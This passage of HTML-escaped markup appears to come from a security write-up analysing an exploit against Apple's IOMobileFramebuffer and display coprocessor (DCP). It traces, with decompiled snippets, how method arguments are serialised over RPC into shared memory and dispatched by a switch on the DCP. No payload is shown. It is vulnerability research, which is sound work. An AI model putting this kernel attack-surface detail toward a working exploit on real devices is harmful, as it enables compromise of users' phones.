class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;return&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;0xE00002C2&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;this unpacks the &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;IOConnectCallMethod&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;arguments and passes them to:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;a id=\"t.4b4f98b94b8ed8638b5222e4f9d81049bbe69fdb\"&gt;&lt;/a&gt;&lt;a id=\"t.4\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c14\"&gt;IOMobileFramebufferAP&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;::&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;set_block_dcp&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c14\"&gt;IOMobileFramebufferAP&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;this&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; task &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;task&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;int&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;first_scalar_input&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;int&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;second_scalar_input&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;const&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;unsigned&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;__int64 &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;pointer_to_remaining_scalar_inputs&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;unsigned&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;int&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;scalar_input_count_minus_2&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;const&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;unsigned&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;__int8 &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;struct_input&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;unsigned&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;__int64 struct_input_size&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;This method uses some autogenerated code to serialise the external method arguments into a buffer like this: &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;a id=\"t.26b4f1ef327e79bf7a370b395d86bddb90eb464f\"&gt;&lt;/a&gt;&lt;a id=\"t.5\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;arg_struct&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;struct&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;task&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0 HovzfPYjjR-c2\"&gt;&amp;nbsp;task&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0 HovzfPYjjR-c2\"&gt;&amp;nbsp; u64 scalar_input_0&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0 HovzfPYjjR-c2\"&gt;&amp;nbsp; u64 scalar_input_1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; u64&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;[]&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0 HovzfPYjjR-c2\"&gt;&amp;nbsp;remaining_scalar_inputs&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0 HovzfPYjjR-c2\"&gt;&amp;nbsp; u64 cntExtraScalars&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; u8&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;[]&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0 HovzfPYjjR-c2\"&gt;&amp;nbsp;structInput&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; u64 &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c14\"&gt;CntStructInput&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;which is then passed to &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;UnifiedPipeline2::rpc&lt;/span&gt;&lt;span&gt;&amp;nbsp;along with a 4-byte ASCII method identifier ('&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;A435&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;' here):&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;a id=\"t.afc7096b3986ce85a82073984786eb19b4fcdb59\"&gt;&lt;/a&gt;&lt;a id=\"t.6\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c14\"&gt;UnifiedPipeline2&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;::&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;rpc&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c22\"&gt;'A435'&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; arg_struct&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;0x105Cu&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;retval_buf&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;4u&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;UnifiedPipeline2::rpc&lt;/span&gt;&lt;span&gt;&amp;nbsp;calls &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;DCPLink::rpc&lt;/span&gt;&lt;span&gt;&amp;nbsp;which calls &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;AppleDCPLinkService::rpc&lt;/span&gt;&lt;span&gt;&amp;nbsp;to perform one more level of serialisation which packs the method identifier and a \"stream identifier\" together with the &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;arg_struct&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;shown above.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;AppleDCPLinkService::rpc&lt;/span&gt;&lt;span&gt;&amp;nbsp;then calls &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;rpc_caller_gated&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;to allocate space in a shared memory buffer, copy the buffer into there then signal to the DCP that a message is available.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;Effectively the implementation of the &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;IOMobileFramebuffer&lt;/span&gt;&lt;span&gt;&amp;nbsp;user client has been moved on to the DCP and the external method interface is now a proxy shim, via shared memory, to the actual implementations of the external methods which &lt;/span&gt;&lt;span&gt;run on the DCP.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"HovzfPYjjR-c15 HovzfPYjjR-c8\" id=\"h.5nfahlo9nbh6\"&gt;&lt;span class=\"HovzfPYjjR-c16 HovzfPYjjR-c2\"&gt;Exploit flow: the other side&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;The next challenge is to find where the messages start being processed on the DCP. Looking through the log strings there's a function which is clearly called ​​&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;rpc_calle&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c26\"&gt;e&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;_gated&lt;/span&gt;&lt;span&gt;&amp;nbsp;- quite likely that's the receive side of the function &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;rpc_calle&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c26\"&gt;r&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;_gated&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;we saw earlier.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;rpc_callee_gated&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;unpacks the wire format then has an enormous switch statement which maps all the 4-letter RPC codes to function pointers:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;a id=\"t.47d68344bf5cd802c2cfc796e38eefd94678d525\"&gt;&lt;/a&gt;&lt;a id=\"t.7\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;switch&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;rpc_id &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;case&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c22\"&gt;'A000'&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;goto&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;LABEL_146&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;case&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c22\"&gt;'A001'&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; handler_fptr &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;callback_handler_A001&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;break&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;case&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c22\"&gt;'A002'&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; handler_fptr &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;callback_handler_A002&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;break&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;case&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c22\"&gt;'A003'&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; handler_fptr &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;callback_handler_A003&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;break&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;case&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c22\"&gt;'A004'&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; handler_fptr &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;callback_handler_A004&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;break&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;case&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c22\"&gt;'A005'&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; handler_fptr &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;callback_handler_A005&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;break&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;At the the bottom of this switch statement is the invocation of the callback handler:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;a id=\"t.727f8d6109f87f45ecfc47e4cbc67fff73f299cf\"&gt;&lt;/a&gt;&lt;a id=\"t.8\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr 